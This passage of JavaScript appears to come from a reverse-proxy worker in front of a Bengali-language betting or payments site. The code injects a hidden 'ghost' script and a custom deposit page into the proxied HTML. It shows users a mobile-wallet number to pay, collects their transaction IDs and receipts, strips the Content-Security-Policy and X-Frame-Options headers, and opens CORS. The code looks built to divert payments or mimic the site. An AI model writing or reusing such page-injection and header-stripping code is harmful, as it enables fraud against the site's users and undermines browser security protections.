                                window.dwSelectedModeName = card.getAttribute('data-mode');
                                
                                if(window.dwSelectedModeName.includes('Agent')) {
                                    document.getElementById('dw-tx-type').innerText = 'ক্যাশআউট';
                                } else if (window.dwSelectedModeName.includes('Personal')) {
                                    document.getElementById('dw-tx-type').innerText = 'সেন্ড মানি';
                                } else {
                                    document.getElementById('dw-tx-type').innerText = 'ব্যাংক ট্রান্সফার';
                                }
                            });
                        });

                        const amountCards = document.querySelectorAll('.dw-amount-card');
                        const customAmountInput = document.getElementById('dw-custom-amount');
                        amountCards.forEach(card => {
                            card.addEventListener('click', () => {
                                amountCards.forEach(c => c.classList.remove('active'));
                                card.classList.add('active');
                                customAmountInput.value = card.innerText.replace(/,/g, '');
                            });
                        });
                    }

                    window.dwBackToHome = function() {
                        window.location.href = '/';
                    };

                    window.dwGoToStep2 = function() {
                        const amount = document.getElementById('dw-custom-amount').value;
                        if(!amount || amount <= 0) { alert("সঠিক পরিমাণ দিন।"); return; }
                        document.getElementById('dw-display-amount').innerText = amount;
                        document.getElementById('dw-display-method-name').innerText = window.dwSelectedModeName;
                        
                        // NOTE: ডায়নামিক নাম্বার হলে এখানে চেঞ্জ করতে হবে।
                        // document.getElementById('dw-wallet-number').innerText = '01327986929';

                        document.getElementById('dw-step1').style.display = 'none';
                        const app = document.getElementById('custom-dw-app');
                        if(app) app.scrollTo(0, 0);
                        document.getElementById('dw-step2').style.display = 'block';
                    };

                    window.dwGoToStep1 = function() {
                        document.getElementById('dw-step2').style.display = 'none';
                        document.getElementById('dw-step1').style.display = 'block';
                    };

                    window.dwCopyNumber = function() {
                        const number = document.getElementById('dw-wallet-number').innerText;
                        navigator.clipboard.writeText(number).then(() => {
                            const toast = document.getElementById("custom-dw-toast");
                            toast.className = "show";
                            setTimeout(() => { toast.className = toast.className.replace("show", ""); }, 3000);
                        });
                    };

                    window.dwUpdateFileName = function(input) {
                        const fileNameDisplay = document.getElementById('dw-file-name-display');
                        if (input.files && input.files[0]) fileNameDisplay.innerText = input.files[0].name;
                        else fileNameDisplay.innerText = "";
                    };

                    window.dwSubmitDeposit = async function() {
                        const trxId = document.getElementById('dw-trxId').value;
                        const amount = document.getElementById('dw-custom-amount').value;
                        const receiptFile = document.getElementById('dw-receiptImg').files[0];
                        
                        if(!trxId) { alert("দয়া করে Transaction ID দিন!"); return; }

                        const submitBtn = document.getElementById('dw-submit-btn');
                        const originalText = submitBtn.innerText;
                        submitBtn.innerText = "Processing...";
                        submitBtn.disabled = true;

                        try {
                            const formData = new FormData();
                            formData.append('amount', amount);
                            formData.append('method', window.dwSelectedModeName);
                            formData.append('transaction_id', trxId);
                            if(receiptFile) formData.append('receipt', receiptFile);

                            // API Call: Using the secure proxy path set in your worker
                            const response = await fetch('/__api_proxy/https://liveapi247.live/apiv9/deposit', {
                                method: 'POST',
                                headers: { 'Accept': 'application/json' },
                                body: formData
                            });

                            const result = await response.json();
                            if(result.status === true) {
                                alert("Success: " + result.msg);
                                document.getElementById('dw-trxId').value = '';
                                document.getElementById('dw-receiptImg').value = '';
                                document.getElementById('dw-file-name-display').innerText = '';
                                window.dwGoToStep1(); 
                            } else {
                                alert("Failed: " + (result.msg || "Something went wrong."));
                            }
                        } catch (error) {
                            alert("Connection error! Please check your internet.");
                        } finally {
                            submitBtn.innerText = originalText;
                            submitBtn.disabled = false;
                        }
                    };

                    window.addEventListener('load', () => {
                        initAppInstallBanner(); 
                        updateBodyClass(); 
                        initCustomDW(); // কাস্টম UI ইনজেক্ট করা
                        urlObserver.observe(document, {subtree: true, childList: true});
                        domObserver.observe(document.body, { childList: true, subtree: true });
                    });
                  })();
                </script>`;

                const ghostScriptTag = `<script src="/__secure_core.js"></script>`;
                if (text.includes('<head>')) {
                  text = text.replace('<head>', '<head>' + ghostScriptTag + customStylesAndScripts);
                } else {
                  text = ghostScriptTag + customStylesAndScripts + text;
                }
            }
        }
        
        responseBody = text;
        newResponseHeaders.delete("content-length"); 
        newResponseHeaders.set("Cache-Control", "no-cache, no-store, must-revalidate");
      } else {
        responseBody = response.body;
      }

      newResponseHeaders.delete("Content-Security-Policy");
      newResponseHeaders.delete("X-Frame-Options");
      newResponseHeaders.set("Access-Control-Allow-Origin", originHeader);
      
      return new Response(responseBody, {
        status: response.status,
        statusText: response.statusText,
        headers: newResponseHeaders
      });
    } catch (error) {
      return new Response("System Error", { status: 500 });
    }
  }
};
